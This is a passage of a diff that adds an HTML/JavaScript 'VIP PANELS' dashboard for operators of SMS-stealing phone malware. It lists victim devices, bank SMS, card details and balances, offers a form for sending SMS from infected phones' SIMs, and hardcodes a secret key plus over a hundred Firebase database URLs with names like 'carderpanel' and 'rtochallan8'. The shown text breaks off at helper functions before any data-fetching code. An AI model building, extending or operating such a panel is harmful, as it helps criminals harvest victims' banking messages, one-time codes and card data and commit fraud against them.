@@ -1,0 +1,1578 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>⚡ VIP PANELS</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Fira Code', 'Courier New', monospace;
+        }
+        body {
+            background: #0a0e14;
+            color: #d4e6ff;
+            min-height: 100vh;
+            padding: 16px;
+            background-image: 
+                linear-gradient(rgba(0, 255, 200, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 200, 0.02) 1px, transparent 1px);
+            background-size: 30px 30px;
+        }
+        .container {
+            max-width: 1440px;
+            margin: 0 auto;
+        }
+
+        /* ---------- ROBOTIC THEME ---------- */
+        .neon-cyan {
+            color: #00f0ff;
+        }
+        .neon-magenta {
+            color: #ff2d95;
+        }
+        .glow-text {
+            text-shadow: 0 0 10px rgba(0, 240, 255, 0.3);
+        }
+        .border-robot {
+            border: 1px solid rgba(0, 240, 255, 0.15);
+            border-radius: 8px;
+            background: rgba(0, 240, 255, 0.02);
+            box-shadow: inset 0 0 30px rgba(0, 240, 255, 0.02);
+        }
+
+        /* ---------- HEADER ---------- */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 16px;
+            padding: 16px 24px;
+            background: rgba(0, 240, 255, 0.03);
+            border: 1px solid rgba(0, 240, 255, 0.1);
+            border-radius: 12px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(4px);
+        }
+        .header .brand {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+        }
+        .header .brand .logo-block {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            line-height: 1;
+        }
+        .header .brand .logo-block .mods {
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: 4px;
+            background: linear-gradient(135deg, #00f0ff, #ff2d95);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .header .brand .logo-block .panel {
+            font-size: 22px;
+            font-weight: 700;
+            color: #00f0ff;
+            letter-spacing: 6px;
+            -webkit-text-fill-color: #00f0ff;
+        }
+        .header .brand .logo-block .power {
+            font-size: 12px;
+            color: #ff2d95;
+            letter-spacing: 3px;
+            -webkit-text-fill-color: #ff2d95;
+            margin-top: 2px;
+            text-transform: uppercase;
+        }
+        .header .brand .logo-block .beyond {
+            font-size: 10px;
+            color: #8892b0;
+            letter-spacing: 2px;
+            -webkit-text-fill-color: #8892b0;
+        }
+        .header .brand .logo-block .limits {
+            font-size: 16px;
+            font-weight: 800;
+            color: #00f0ff;
+            letter-spacing: 4px;
+            -webkit-text-fill-color: #00f0ff;
+        }
+        .header .right-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .header .status-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 16px;
+            border-radius: 40px;
+            font-size: 13px;
+            font-weight: 500;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(0, 240, 255, 0.06);
+            color: #94a3b8;
+        }
+        .header .status-badge .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #475569;
+        }
+        .header .status-badge .dot.online {
+            background: #22c55e;
+            box-shadow: 0 0 12px rgba(34, 197, 94, 0.5);
+        }
+        .header .status-badge .dot.offline {
+            background: #475569;
+        }
+        #logoutBtn {
+            background: rgba(239, 68, 68, 0.08);
+            border: 1px solid rgba(239, 68, 68, 0.15);
+            color: #ef4444;
+            padding: 6px 18px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 13px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        #logoutBtn:hover {
+            background: rgba(239, 68, 68, 0.15);
+        }
+
+        /* ---------- STATS ---------- */
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+            gap: 12px;
+            margin-bottom: 18px;
+        }
+        .stat-box {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(0, 240, 255, 0.04);
+            border-radius: 8px;
+            padding: 14px 12px;
+            text-align: center;
+            transition: 0.2s;
+        }
+        .stat-box:hover {
+            border-color: rgba(0, 240, 255, 0.2);
+        }
+        .stat-box .num {
+            font-size: 28px;
+            font-weight: 700;
+            color: #f8fafc;
+            font-family: 'Fira Code', monospace;
+        }
+        .stat-box .label {
+            font-size: 10px;
+            color: #64748b;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 2px;
+            font-family: 'Fira Code', monospace;
+        }
+        .stat-box.online .num { color: #22c55e; }
+        .stat-box.offline .num { color: #475569; }
+        .stat-box.bank .num { color: #00f0ff; }
+        .stat-box.card .num { color: #ff2d95; }
+
+        /* ---------- TABS ---------- */
+        .tabs {
+            display: flex;
+            gap: 4px;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(0, 240, 255, 0.04);
+            border-radius: 8px;
+            padding: 4px;
+            margin-bottom: 18px;
+            flex-wrap: wrap;
+        }
+        .tabs button {
+            padding: 8px 18px;
+            border: none;
+            background: transparent;
+            color: #64748b;
+            font-size: 13px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: 'Fira Code', monospace;
+        }
+        .tabs button:hover { color: #e2e8f0; }
+        .tabs button.active {
+            background: rgba(0, 240, 255, 0.08);
+            color: #00f0ff;
+            box-shadow: 0 0 20px rgba(0, 240, 255, 0.05);
+        }
+        .tabs button .count {
+            background: rgba(255, 255, 255, 0.04);
+            padding: 0 8px;
+            border-radius: 30px;
+            font-size: 10px;
+            margin-left: 6px;
+        }
+        .tabs button.active .count {
+            background: rgba(0, 240, 255, 0.1);
+            color: #00f0ff;
+        }
+
+        /* ---------- DEVICES ---------- */
+        .device-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(270px, 1fr));
+            gap: 16px;
+        }
+        .device-card {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(0, 240, 255, 0.06);
+            border-radius: 8px;
+            padding: 18px 18px 16px;
+            cursor: pointer;
+            transition: 0.25s;
+            position: relative;
+            backdrop-filter: blur(2px);
+        }
+        .device-card:hover {
+            border-color: #00f0ff;
+            background: rgba(0, 240, 255, 0.04);
+            transform: translateY(-3px);
+            box-shadow: 0 0 30px rgba(0, 240, 255, 0.05), inset 0 0 30px rgba(0, 240, 255, 0.02);
+        }
+        .device-card .top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 4px;
+        }
+        .device-card .name {
+            font-size: 15px;
+            font-weight: 600;
+            color: #f8fafc;
+            font-family: 'Fira Code', monospace;
+        }
+        .device-card .source-tag {
+            font-size: 8px;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: #00f0ff;
+            background: rgba(0, 240, 255, 0.06);
+            padding: 2px 8px;
+            border-radius: 4px;
+            border: 1px solid rgba(0, 240, 255, 0.1);
+            max-width: 100px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            font-family: 'Fira Code', monospace;
+        }
+        .device-card .id {
+            font-size: 10px;
+            color: #475569;
+            font-family: monospace;
+            margin-bottom: 6px;
+            word-break: break-all;
+        }
+        .device-card .status-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-right: 4px;
+        }
+        .device-card .status-dot.online {
+            background: #22c55e;
+            box-shadow: 0 0 8px rgba(34, 197, 94, 0.3);
+        }
+        .device-card .status-dot.offline { background: #475569; }
+        .device-card .status-label {
+            font-size: 12px;
+            font-weight: 600;
+        }
+        .device-card .status-label.online { color: #22c55e; }
+        .device-card .status-label.offline { color: #475569; }
+        .device-card .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2px 12px;
+            margin: 8px 0 8px;
+            font-size: 13px;
+        }
+        .device-card .info-grid .lbl {
+            color: #64748b;
+            font-size: 10px;
+            text-transform: uppercase;
+            font-family: 'Fira Code', monospace;
+        }
+        .device-card .info-grid .val {
+            color: #e2e8f0;
+            font-weight: 500;
+            text-align: right;
+            font-size: 13px;
+            font-family: 'Fira Code', monospace;
+        }
+        .device-card .info-grid .val.mono {
+            font-family: monospace;
+            font-size: 11px;
+        }
+        .device-card .battery-bar {
+            height: 3px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 6px;
+        }
+        .device-card .battery-bar .fill {
+            height: 100%;
+            border-radius: 4px;
+            transition: width 0.5s;
+        }
+        .device-card .tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+            margin-top: 10px;
+        }
+        .device-card .tag {
+            font-size: 9px;
+            font-weight: 700;
+            padding: 2px 10px;
+            border-radius: 4px;
+            border: 1px solid transparent;
+            text-transform: uppercase;
+            font-family: 'Fira Code', monospace;
+        }
+        .tag.bank {
+            color: #00f0ff;
+            background: rgba(0, 240, 255, 0.06);
+            border-color: rgba(0, 240, 255, 0.1);
+        }
+        .tag.card {
+            color: #ff2d95;
+            background: rgba(255, 45, 149, 0.06);
+            border-color: rgba(255, 45, 149, 0.1);
+        }
+        .tag.upi {
+            color: #f97316;
+            background: rgba(249, 115, 22, 0.06);
+            border-color: rgba(249, 115, 22, 0.1);
+        }
+        .device-card .bank-preview {
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid rgba(0, 240, 255, 0.04);
+        }
+        .device-card .bank-preview .row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+        }
+        .device-card .bank-preview .bnk {
+            color: #00f0ff;
+            font-weight: 500;
+        }
+        .device-card .bank-preview .bal {
+            color: #f8fafc;
+            font-weight: 700;
+        }
+        .device-card .card-preview {
+            margin-top: 8px;
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            font-size: 10px;
+            font-family: monospace;
+            color: #ff2d95;
+            background: rgba(255, 45, 149, 0.04);
+            padding: 4px 12px;
+            border-radius: 4px;
+            border: 1px solid rgba(255, 45, 149, 0.06);
+            width: fit-content;
+        }
+
+        .loading-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #475569;
+        }
+        .loading-state .spinner {
+            width: 30px;
+            height: 30px;
+            border: 3px solid rgba(255, 255, 255, 0.04);
+            border-top-color: #00f0ff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 12px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #475569;
+        }
+        .empty-state .icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+            opacity: 0.3;
+        }
+        .footer {
+            text-align: center;
+            color: #1e293b;
+            font-size: 11px;
+            margin-top: 30px;
+            padding: 16px 0;
+            border-top: 1px solid rgba(0, 240, 255, 0.02);
+            font-family: 'Fira Code', monospace;
+        }
+
+        /* ---------- DETAIL ---------- */
+        .detail-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 1000;
+            display: flex;
+            justify-content: flex-end;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            animation: fadeIn 0.25s ease;
+        }
+        .detail-overlay.closing {
+            animation: fadeOut 0.2s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
+        }
+        .detail-panel {
+            width: 100%;
+            max-width: 500px;
+            height: 100%;
+            background: #0b111f;
+            border-left: 1px solid rgba(0, 240, 255, 0.06);
+            overflow-y: auto;
+            padding: 20px 16px 30px;
+            animation: slideIn 0.25s ease;
+        }
+        .detail-panel.slide-out {
+            animation: slideOut 0.2s ease forwards;
+        }
+        @keyframes slideIn {
+            from { transform: translateX(100%); }
+            to { transform: translateX(0); }
+        }
+        @keyframes slideOut {
+            from { transform: translateX(0); }
+            to { transform: translateX(100%); }
+        }
+        .detail-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding-bottom: 16px;
+            border-bottom: 1px solid rgba(0, 240, 255, 0.04);
+            margin-bottom: 16px;
+        }
+        .detail-header .left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .detail-header .left .name {
+            font-size: 18px;
+            font-weight: 700;
+            color: #f8fafc;
+            font-family: 'Fira Code', monospace;
+        }
+        .detail-header .left .st {
+            font-size: 12px;
+            font-weight: 600;
+        }
+        .detail-header .close-btn {
+            background: rgba(255, 255, 255, 0.04);
+            border: none;
+            color: #64748b;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.2s;
+        }
+        .detail-header .close-btn:hover {
+            background: rgba(255, 255, 255, 0.08);
+            color: #f8fafc;
+        }
+        .detail-tabs {
+            display: flex;
+            gap: 4px;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(0, 240, 255, 0.04);
+            border-radius: 8px;
+            padding: 4px;
+            margin-bottom: 16px;
+        }
+        .detail-tabs button {
+            flex: 1;
+            padding: 8px 8px;
+            border: none;
+            background: transparent;
+            color: #64748b;
+            font-size: 12px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: 0.2s;
+            text-align: center;
+            font-family: 'Fira Code', monospace;
+        }
+        .detail-tabs button.active {
+            background: rgba(0, 240, 255, 0.06);
+            color: #00f0ff;
+        }
+        .detail-tabs button .cnt {
+            background: rgba(255, 255, 255, 0.04);
+            padding: 0 6px;
+            border-radius: 30px;
+            font-size: 9px;
+            margin-left: 2px;
+        }
+        .detail-tabs button.active .cnt {
+            background: rgba(0, 240, 255, 0.1);
+            color: #00f0ff;
+        }
+        .detail-content .section-label {
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #475569;
+            font-weight: 700;
+            margin: 18px 0 8px;
+            font-family: 'Fira Code', monospace;
+        }
+        .detail-content .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
+            font-size: 13px;
+            font-family: 'Fira Code', monospace;
+        }
+        .detail-content .info-row .lbl {
+            color: #64748b;
+        }
+        .detail-content .info-row .val {
+            color: #e2e8f0;
+            font-weight: 500;
+            text-align: right;
+            max-width: 60%;
+            word-break: break-word;
+        }
+        .detail-content .info-row .val.mono {
+            font-family: monospace;
+            font-size: 12px;
+        }
+        .detail-content .info-row .val.highlight {
+            color: #00f0ff;
+        }
+        .detail-bank-item {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(0, 240, 255, 0.04);
+            border-radius: 8px;
+            padding: 12px 14px;
+            margin-bottom: 8px;
+        }
+        .detail-bank-item .row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+        }
+        .detail-bank-item .bnk {
+            color: #00f0ff;
+            font-weight: 600;
+        }
+        .detail-bank-item .bal {
+            color: #f8fafc;
+            font-weight: 700;
+        }
+        .detail-bank-item .sub {
+            font-size: 11px;
+            color: #64748b;
+            margin-top: 4px;
+        }
+        .sms-item {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(0, 240, 255, 0.04);
+            border-radius: 8px;
+            padding: 10px 12px;
+            margin-bottom: 6px;
+            font-size: 12px;
+        }
+        .sms-item .sms-header {
+            display: flex;
+            justify-content: space-between;
+            color: #64748b;
+            font-size: 10px;
+            margin-bottom: 4px;
+        }
+        .sms-item .sms-body {
+            color: #e2e8f0;
+            line-height: 1.5;
+            word-break: break-word;
+        }
+        .send-form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 8px;
+        }
+        .send-form .sim-selector {
+            display: flex;
+            gap: 8px;
+        }
+        .send-form .sim-selector button {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 8px;
+            background: transparent;
+            color: #64748b;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: 'Fira Code', monospace;
+        }
+        .send-form .sim-selector button.active {
+            border-color: #00f0ff;
+            background: rgba(0, 240, 255, 0.06);
+            color: #f8fafc;
+        }
+        .send-form input, .send-form textarea {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 8px;
+            padding: 12px 14px;
+            color: #f0f4ff;
+            font-size: 14px;
+            outline: none;
+            transition: 0.2s;
+            width: 100%;
+            font-family: 'Fira Code', monospace;
+        }
+        .send-form input:focus, .send-form textarea:focus {
+            border-color: #00f0ff;
+            background: rgba(0, 240, 255, 0.04);
+        }
+        .send-form textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+        .send-form .btn-send {
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #00f0ff, #ff2d95);
+            color: #0a0e14;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: 'Fira Code', monospace;
+        }
+        .send-form .btn-send:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(0, 240, 255, 0.3);
+        }
+        .send-form .btn-send:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        @media (max-width: 640px) {
+            .header .brand .logo-block .mods { font-size: 22px; }
+            .header .brand .logo-block .panel { font-size: 18px; }
+            .stats-row { grid-template-columns: repeat(2, 1fr); }
+            .device-grid { grid-template-columns: 1fr; }
+            .tabs button { padding: 6px 10px; font-size: 11px; }
+            .detail-panel { max-width: 100%; padding: 16px 12px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="brand">
+                <div class="logo-block">
+                    <div class="mods">VIP PANELS</div>
+                    <div class="panel">PANEL</div>
+                    <div style="display:flex; gap:6px; align-items:baseline;">
+                        <span class="power">VIP</span>
+                        <span class="beyond">PANEL</span>
+                        <span class="limits">PREMIUM</span>
+                    </div>
+                </div>
+            </div>
+            <div class="right-section">
+                <div class="status-badge" id="globalStatus">
+                    <span class="dot offline" id="statusDot"></span>
+                    <span id="statusLabel">Booting...</span>
+                </div>
+                <button id="logoutBtn">⏻ Logout</button>
+            </div>
+        </header>
+
+        <div id="dashboard" class="dashboard">
+            <div class="stats-row" id="statsRow">
+                <div class="stat-box"><div class="num" id="statTotal">0</div><div class="label">Total</div></div>
+                <div class="stat-box online"><div class="num" id="statOnline">0</div><div class="label">Online</div></div>
+                <div class="stat-box offline"><div class="num" id="statOffline">0</div><div class="label">Offline</div></div>
+                <div class="stat-box bank"><div class="num" id="statBank">0</div><div class="label">Bank SMS</div></div>
+                <div class="stat-box card"><div class="num" id="statCard">0</div><div class="label">Cards</div></div>
+            </div>
+
+            <div class="tabs" id="tabContainer">
+                <button class="active" data-tab="all">All <span class="count" id="tabAllCount">0</span></button>
+                <button data-tab="online">Online <span class="count" id="tabOnlineCount">0</span></button>
+                <button data-tab="offline">Offline <span class="count" id="tabOfflineCount">0</span></button>
+                <button data-tab="bank">Bank <span class="count" id="tabBankCount">0</span></button>
+                <button data-tab="card">Cards <span class="count" id="tabCardCount">0</span></button>
+            </div>
+
+            <div id="devicesContainer">
+                <div class="loading-state">
+                    <div class="spinner"></div>
+                    <div>Loading 180+ databases...</div>
+                </div>
+            </div>
+
+            <div class="footer">⚡ VIP PANEL· Multi‑Source Fusion · v3.0</div>
+        </div>
+    </div>
+
+    <div id="detailContainer"></div>
+
+    <script>
+        // ======================================================================
+        // 🔥 SECRET KEY (as per user)
+        // ======================================================================
+        const FIREBASE_SECRET = "chotukumar";
+
+        // ======================================================================
+        // 🔥 ALL UNIQUE FIREBASE URLS (merged from all lists)
+        // ======================================================================
+        const FIREBASE_URLS = [
+            // ---- From Chotu Kumar list (10) ----
+            "https://komaljah-default-rtdb.firebaseio.com",
+            "https://oyilo-5cada-default-rtdb.firebaseio.com",
+            "https://palms-568c7-default-rtdb.firebaseio.com",
+            "https://chutkabaal-d7051-default-rtdb.firebaseio.com",
+            "https://annapunna-12b79-default-rtdb.firebaseio.com",
+            "https://project-f2fd6-default-rtdb.firebaseio.com",
+            "https://ikka-eb7e5-default-rtdb.firebaseio.com",
+            "https://newappi-7661a-default-rtdb.firebaseio.com",
+            "https://pm13-3f80f-default-rtdb.asia-southeast1.firebasedatabase.app",
+            "https://kabir-db-default-rtdb.firebaseio.com",
+
+            // ---- From ROLEX VIP list (first 50) ----
+            "https://upandar-bb51e-default-rtdb.firebaseio.com",
+            "https://vvvvv-b5eae-default-rtdb.firebaseio.com",
+            "https://rettiugh-default-rtdb.firebaseio.com",
+            "https://rajkumar-b6cbe-default-rtdb.firebaseio.com",
+            "https://zeni-ae60b-default-rtdb.firebaseio.com",
+            "https://lucifer-spreader-default-rtdb.firebaseio.com",
+            "https://admin-cliwny-default-rtdb.firebaseio.com",
+            "https://bunty-51bcc-default-rtdb.firebaseio.com",
+            "https://bulbul8084-9a5df-default-rtdb.firebaseio.com",
+            "https://deepak-c22e3-default-rtdb.firebaseio.com",
+            "https://jeet-op-default-rtdb.firebaseio.com",
+            "https://sexypayload-default-rtdb.firebaseio.com",
+            "https://ravan-98ef1-default-rtdb.firebaseio.com",
+            "https://totla-axis-default-rtdb.firebaseio.com",
+            "https://tracegod-168d5-default-rtdb.firebaseio.com",
+            "https://tuuui-60b15-default-rtdb.firebaseio.com",
+            "https://yellow-pannel-dadc7-default-rtdb.firebaseio.com",
+            "https://hood-4ba1e-default-rtdb.firebaseio.com",
+            "https://suman-penal-default-rtdb.firebaseio.com",
+            "https://rtoo-6c8e6-default-rtdb.firebaseio.com",
+            "https://jj-gambler-default-rtdb.firebaseio.com",
+            "https://rohet10-8919f-default-rtdb.firebaseio.com",
+            "https://danish-77fe3-default-rtdb.firebaseio.com",
+            "https://rolex-carder-default-rtdb.firebaseio.com",
+            "https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com",
+            "https://rto-02-april06-default-rtdb.firebaseio.com",
+            "https://hdrbf-485ec-default-rtdb.firebaseio.com",
+            "https://admin-sonu-8a567-default-rtdb.firebaseio.com",
+            "https://uc-op-ca3d2-default-rtdb.firebaseio.com",
+            "https://demonrat-aa782-default-rtdb.firebaseio.com",
+            "https://pint-f465b-default-rtdb.firebaseio.com",
+            "https://master-admin-6c650-default-rtdb.firebaseio.com",
+            "https://rajababukvirat-default-rtdb.firebaseio.com",
+            "https://seuihd-default-rtdb.firebaseio.com",
+            "https://comkingdir-default-rtdb.firebaseio.com",
+            "https://download-b7393-default-rtdb.firebaseio.com",
+            "https://gigapaid-39e9c-default-rtdb.firebaseio.com",
+            "https://riyy-e012e-default-rtdb.firebaseio.com",
+            "https://jonisins-52271-default-rtdb.firebaseio.com",
+            "https://jkhsadfhjk-default-rtdb.firebaseio.com",
+            "https://harrwp-6be36-default-rtdb.firebaseio.com",
+            "https://angeladmin-9dedc-default-rtdb.firebaseio.com",
+            "https://iiiii-ade0e-default-rtdb.firebaseio.com",
+            "https://chhgg-dc213-default-rtdb.firebaseio.com",
+            "https://priysnshuu-default-rtdb.firebaseio.com",
+            "https://admin-panel-khanashif-default-rtdb.firebaseio.com",
+            "https://sonic-d5c1a-default-rtdb.firebaseio.com",
+            "https://jannu-c03ea-default-rtdb.firebaseio.com",
+            "https://haab-b3370-default-rtdb.firebaseio.com",
+            "https://dusman-abf8b-default-rtdb.firebaseio.com",
+            "https://no-admin-e0a30-default-rtdb.firebaseio.com",
+            "https://admin-panel-bfcdc-default-rtdb.firebaseio.com",
+            "https://rich-people-19e06-default-rtdb.firebaseio.com",
+            "https://singhaana-6f199-default-rtdb.firebaseio.com",
+            "https://jeko-c11ef-default-rtdb.firebaseio.com",
+            "https://ueuwuw-default-rtdb.firebaseio.com",
+            "https://carderpanel-default-rtdb.firebaseio.com",
+            "https://i-am-devil-9297c-default-rtdb.firebaseio.com",
+            "https://anudg-21c1c-default-rtdb.firebaseio.com",
+            "https://rajkumar-5af9d-default-rtdb.firebaseio.com",
+            "https://admin-panel-client-a3ee5-default-rtdb.firebaseio.com",
+            "https://autobot-e9a28-default-rtdb.firebaseio.com",
+            "https://suwer-64cd1-default-rtdb.firebaseio.com",
+            "https://admin-chorsala-default-rtdb.firebaseio.com",
+            "https://rmx3511uuj-default-rtdb.firebaseio.com",
+            "https://zinga-1ae57-default-rtdb.firebaseio.com",
+            "https://kali-1b217-default-rtdb.firebaseio.com",
+            "https://arvind-c5b03-default-rtdb.firebaseio.com",
+            "https://rtomumbai-bc919-default-rtdb.firebaseio.com",
+            "https://santosh-8-default-rtdb.firebaseio.com",
+            "https://alienware-c11b0-default-rtdb.firebaseio.com",
+            "https://aaenop720-34097-default-rtdb.firebaseio.com",
+            "https://motka-5b21d-default-rtdb.firebaseio.com",
+            "https://amirrr-8a463-default-rtdb.firebaseio.com",
+            "https://raja-bhaiya-62-default-rtdb.firebaseio.com",
+            "https://gggggg-979bd-default-rtdb.firebaseio.com",
+            "https://s85138920-87594-default-rtdb.firebaseio.com",
+            "https://update-cf7a9-default-rtdb.firebaseio.com",
+            "https://suraj-b9a86-default-rtdb.firebaseio.com",
+            "https://root-3rto-default-rtdb.firebaseio.com",
+            "https://ajay-33c1b-default-rtdb.firebaseio.com",
+            "https://mafiaaaa2oppp-default-rtdb.firebaseio.com",
+            "https://hdjdjdj-a73f2-default-rtdb.firebaseio.com",
+            "https://rexxx-4c7a7-default-rtdb.firebaseio.com",
+            "https://rtochallan8-default-rtdb.firebaseio.com",
+            "https://rajakk-80ecd-default-rtdb.firebaseio.com",
+            "https://miyakhalifa-143d5-default-rtdb.firebaseio.com",
+            "https://maxbhai-b8d3a-default-rtdb.firebaseio.com",
+            "https://sudhir-suexs-seox-default-rtdb.firebaseio.com",
+            "https://dharmesh-panel-default-rtdb.firebaseio.com",
+            "https://dhumm-90a53-default-rtdb.firebaseio.com",
+            "https://shadow-f9cd3-default-rtdb.firebaseio.com",
+            "https://ahisjija-default-rtdb.firebaseio.com",
+            "https://ayan-5581d-default-rtdb.firebaseio.com",
+            "https://simadevi-f42fc-default-rtdb.firebaseio.com",
+
+            // ---- From "strange-2e4aa" file ----
+            "https://strange-2e4aa-default-rtdb.firebaseio.com",
+            "https://jsjsjdj-7f0d1-default-rtdb.firebaseio.com",
+            "https://runjun-master-panel-default-rtdb.firebaseio.com",
+            "https://raaz-5287d-default-rtdb.firebaseio.com",
+            "https://gsjjshdbs-default-rtdb.firebaseio.com",
+            "https://newspreding-default-rtdb.firebaseio.com",
+            "https://painislv-default-rtdb.firebaseio.com",
+            "https://apkpure-6eb6a-default-rtdb.firebaseio.com",
+            "https://e9turnament1-default-rtdb.firebaseio.com",
+            "https://e14turnament2-default-rtdb.firebaseio.com",
+            "https://tinmm88-b7db5-default-rtdb.firebaseio.com",
+            "https://vibe-d238e-default-rtdb.firebaseio.com",
+            "https://privatesok-59944-default-rtdb.firebaseio.com",
+            "https://risho-d4c66-default-rtdb.firebaseio.com",
+            "https://rahais-default-rtdb.firebaseio.com",
+            "https://ravi-23776-default-rtdb.firebaseio.com",
+            "https://fir-27c9e-default-rtdb.firebaseio.com",
+            "https://fir-1fa16-default-rtdb.firebaseio.com",
+            "https://bossuun-default-rtdb.firebaseio.com",
+            "https://rahul-54fe9-default-rtdb.firebaseio.com"
+        ];
+
+        // Remove duplicates
+        const uniqueUrls = [...new Set(FIREBASE_URLS)];
+        // Clean: remove any query parameters (like ?auth=...) — we only want base URL
+        const cleanedUrls = uniqueUrls.map(u => u.split('?')[0]);
+        // final list
+        const FINAL_URLS = [...new Set(cleanedUrls)];
+
+        // ======================================================================
+        // STATE
+        // ======================================================================
+        let devices = [];
+        let filteredDevices = [];
+        let currentTab = 'all';
+        let isConnected = false;
+        let selectedDevice = null;
+        let detailTab = 'info';
+        let smsMessages = [];
+        let smsAnalysis = { bankBalances: [], cards: [], phoneNumbers: [], networks: [] };
+        let simSelected = 1;
+        let detailSmsInterval = null;
+        let devicesInterval = null;
+
+        const statusDot = document.getElementById('statusDot');
+        const statusLabel = document.getElementById('statusLabel');
+        const globalStatus = document.getElementById('globalStatus');
+        const statTotal = document.getElementById('statTotal');
+        const statOnline = document.getElementById('statOnline');
+        const statOffline = document.getElementById('statOffline');
+        const statBank = document.getElementById('statBank');
+        const statCard = document.getElementById('statCard');
+        const tabAllCount = document.getElementById('tabAllCount');
+        const tabOnlineCount = document.getElementById('tabOnlineCount');
+        const tabOfflineCount = document.getElementById('tabOfflineCount');
+        const tabBankCount = document.getElementById('tabBankCount');
+        const tabCardCount = document.getElementById('tabCardCount');
+        const devicesContainer = document.getElementById('devicesContainer');
+        const detailContainer = document.getElementById('detailContainer');
+        const tabContainer = document.getElementById('tabContainer');
+
+        function setGlobalStatus(connected, msg) {
+            if (connected) {
+                statusDot.className = 'dot online';
+                statusLabel.textContent = 'Connected';
+                globalStatus.style.borderColor = 'rgba(34,197,94,0.2)';
+                isConnected = true;
+            } else {
+                statusDot.className = 'dot offline';
+                statusLabel.textContent = msg || 'Disconnected';
+                globalStatus.style.borderColor = 'rgba(255,255,255,0.06)';
+                isConnected = false;
+            }
+        }
+
+        function parseBattery(val) {
+            if (!val) return { percent: 0, label: '—' };
+            const str = String(val).replace('%', '').trim();
+            const num = parseInt(str);
+            if (isNaN(num)) return { percent: 0, label: str };
+            return { percent: Math.min(Math.max(num, 0), 100), label: num + '%' };
+        }
+
+        function getStatusColor(percent) {
+            if (percent >= 60) return '#4ade80';
+            if (percent >= 30) return '#facc15';
+            return '#ef4444';
+        }
+
